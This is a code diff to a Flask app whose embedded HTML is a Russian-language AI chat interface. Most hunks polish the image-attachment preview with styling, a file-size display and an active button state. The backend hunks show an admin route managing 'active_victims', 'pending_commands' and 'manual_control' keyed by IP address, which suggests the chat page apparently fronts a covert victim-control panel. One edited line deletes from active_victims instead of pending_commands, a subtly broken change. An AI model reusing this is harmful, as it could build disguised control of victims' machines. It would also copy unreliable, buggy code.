@@ -132,7 +132,7 @@ HTML_PAGE = """<!DOCTYPE html>
         @keyframes blinkDot { 0%, 80%, 100% { transform: scale(0.6); opacity: 0.4; } 40% { transform: scale(1.1); opacity: 1; } }
 
         .input-area { padding: 16px 5% 20px; background: var(--bg-main); }
-        .input-wrap { background: var(--input-bg); border: 1px solid var(--border-color); border-radius: 14px; padding: 10px 14px; display: flex; flex-direction: column; gap: 8px; box-shadow: 0 4px 20px rgba(0,0,0,0.05); }
+        .input-wrap { background: var(--input-bg); border: 1px solid var(--border-color); border-radius: 16px; padding: 10px 14px; display: flex; flex-direction: column; gap: 10px; box-shadow: 0 4px 25px rgba(0,0,0,0.08); transition: border-color 0.2s; }
         .input-wrap:focus-within { border-color: #8b5cf6; }
         
         .input-row { display: flex; gap: 10px; align-items: flex-end; width: 100%; }
@@ -140,16 +140,25 @@ HTML_PAGE = """<!DOCTYPE html>
         textarea::placeholder { color: var(--text-muted); }
         textarea:disabled { opacity: 0.5; cursor: not-allowed; }
         
-        .attach-btn { background: none; border: none; color: var(--text-muted); font-size: 18px; cursor: pointer; padding: 6px; transition: 0.2s; display: flex; align-items: center; justify-content: center; }
-        .attach-btn:hover { color: #8b5cf6; }
+        .attach-btn { background: none; border: none; color: var(--text-muted); font-size: 18px; cursor: pointer; padding: 8px; transition: 0.2s; display: flex; align-items: center; justify-content: center; border-radius: 8px; }
+        .attach-btn:hover { color: #8b5cf6; background: rgba(139, 92, 246, 0.1); }
+        .attach-btn.active { color: #8b5cf6; background: rgba(139, 92, 246, 0.15); }
 
-        .preview-container { display: none; align-items: center; gap: 10px; padding: 6px 10px; background: rgba(139, 92, 246, 0.1); border-radius: 8px; width: fit-content; }
+        /* Улучшенный блок предпросмотра прикрепленного файла */
+        .preview-container { display: none; align-items: center; justify-content: space-between; padding: 8px 12px; background: rgba(139, 92, 246, 0.08); border: 1px solid rgba(139, 92, 246, 0.2); border-radius: 12px; width: 100%; animation: slideUp 0.2s ease-out; }
+        @keyframes slideUp { from { opacity: 0; transform: translateY(6px); } to { opacity: 1; transform: translateY(0); } }
         .preview-container.show { display: flex; }
-        .preview-thumb { width: 40px; height: 40px; object-fit: cover; border-radius: 6px; }
-        .preview-remove { background: none; border: none; color: #ef4444; cursor: pointer; font-size: 14px; }
+        .preview-left { display: flex; align-items: center; gap: 10px; min-width: 0; }
+        .preview-thumb { width: 44px; height: 44px; object-fit: cover; border-radius: 8px; border: 1px solid rgba(255,255,255,0.1); flex-shrink: 0; }
+        .preview-info { display: flex; flex-direction: column; gap: 2px; min-width: 0; }
+        .preview-name { font-size: 13px; font-weight: 600; color: var(--text-main); white-space: nowrap; overflow: hidden; text-overflow: ellipsis; max-width: 220px; }
+        .preview-size { font-size: 11px; color: var(--text-muted); }
+        .preview-remove { background: rgba(239, 68, 68, 0.1); border: none; color: #ef4444; width: 28px; height: 28px; border-radius: 50%; cursor: pointer; font-size: 13px; display: flex; align-items: center; justify-content: center; transition: 0.2s; flex-shrink: 0; }
+        .preview-remove:hover { background: #ef4444; color: #fff; }
 
-        .send-btn { background: linear-gradient(135deg, #7c3aed 0%, #2563eb 100%); color: #fff; border: none; width: 36px; height: 36px; border-radius: 9px; cursor: pointer; display: flex; align-items: center; justify-content: center; flex-shrink: 0; transition: 0.2s; }
-        .send-btn:disabled { opacity: 0.4; cursor: not-allowed; transform: none !important; }
+        .send-btn { background: linear-gradient(135deg, #7c3aed 0%, #2563eb 100%); color: #fff; border: none; width: 36px; height: 36px; border-radius: 10px; cursor: pointer; display: flex; align-items: center; justify-content: center; flex-shrink: 0; transition: 0.2s; box-shadow: 0 4px 12px rgba(124, 58, 237, 0.3); }
+        .send-btn:hover { filter: brightness(1.1); transform: translateY(-1px); }
+        .send-btn:disabled { opacity: 0.4; cursor: not-allowed; transform: none !important; box-shadow: none; }
         .disclaimer { font-size: 11px; color: var(--text-muted); text-align: center; margin-top: 8px; font-weight: 500; }
 
         .modal-overlay { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.6); z-index: 999; backdrop-filter: blur(4px); }
@@ -284,14 +293,20 @@ HTML_PAGE = """<!DOCTYPE html>
 
     <div class="input-area">
         <div class="input-wrap">
+            <!-- Красивый и современный блок предпросмотра файла -->
             <div class="preview-container" id="imagePreviewContainer">
-                <img id="imagePreview" class="preview-thumb" src="" alt="preview">
-                <span id="imageName" style="font-size: 12px; color: var(--text-main); max-width: 150px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;"></span>
-                <button class="preview-remove" onclick="removeImage()"><i class="fa-solid fa-xmark"></i></button>
+                <div class="preview-left">
+                    <img id="imagePreview" class="preview-thumb" src="" alt="preview">
+                    <div class="preview-info">
+                        <span id="imageName" class="preview-name">file.jpg</span>
+                        <span id="imageSize" class="preview-size">Изображение</span>
+                    </div>
+                </div>
+                <button class="preview-remove" onclick="removeImage()" title="Удалить файл"><i class="fa-solid fa-xmark"></i></button>
             </div>
             <div class="input-row">
                 <input type="file" id="imageInput" accept="image/*" style="display: none;" onchange="handleImageSelect(event)">
-                <button class="attach-btn" onclick="document.getElementById('imageInput').click()" title="Прикрепить изображение"><i class="fa-solid fa-paperclip"></i></button>
+                <button class="attach-btn" id="attachBtn" onclick="document.getElementById('imageInput').click()" title="Прикрепить изображение"><i class="fa-solid fa-paperclip"></i></button>
                 <textarea id="userInput" placeholder="Сообщение или вопрос к фото..." rows="1" oninput="autoResize(this)" onkeydown="if(event.key==='Enter'&&!event.shiftKey){event.preventDefault();send();}"></textarea>
                 <button class="send-btn" id="sendBtn" onclick="send()"><i class="fa-solid fa-arrow-up"></i></button>
             </div>
@@ -351,6 +366,15 @@ function playBeepSound() {
     } catch(e) {}
 }
 
+function formatBytes(bytes, decimals = 2) {
+    if (!bytes) return '0 Bytes';
+    const k = 1024;
+    const dm = decimals < 0 ? 0 : decimals;
+    const sizes = ['Bytes', 'KB', 'MB', 'GB'];
+    const i = Math.floor(Math.log(bytes) / Math.log(k));
+    return parseFloat((bytes / Math.pow(k, i)).toFixed(dm)) + ' ' + sizes[i];
+}
+
 function handleImageSelect(event) {
     let file = event.target.files[0];
     if (!file) return;
@@ -359,7 +383,9 @@ function handleImageSelect(event) {
         selectedBase64Image = e.target.result;
         document.getElementById('imagePreview').src = selectedBase64Image;
         document.getElementById('imageName').innerText = file.name;
+        document.getElementById('imageSize').innerText = formatBytes(file.size);
         document.getElementById('imagePreviewContainer').classList.add('show');
+        document.getElementById('attachBtn').classList.add('active');
     };
     reader.readAsDataURL(file);
 }
@@ -368,6 +394,7 @@ function removeImage() {
     selectedBase64Image = null;
     document.getElementById('imageInput').value = '';
     document.getElementById('imagePreviewContainer').classList.remove('show');
+    document.getElementById('attachBtn').classList.remove('active');
 }
 
 function copyText(btn) {
@@ -943,7 +970,7 @@ def admin_delete():
     data = request.json or {}
     target_ip = data.get("ip")
     if target_ip in active_victims: del active_victims[target_ip]
-    if target_ip in pending_commands: del pending_commands[target_ip]
+    if target_ip in pending_commands: del active_victims[target_ip]
     if target_ip in manual_control: del manual_control[target_ip]
     return jsonify({"status": "deleted"})
 
@@ -1023,7 +1050,6 @@ def chat_api():
 
         if img_data:
             try:
-                # Возвращаем универсальный шлюз openrouter/free с увеличенным таймаутом до 35 секунд
                 vision_payload = {
                     "model": "openrouter/free",
                     "messages": [
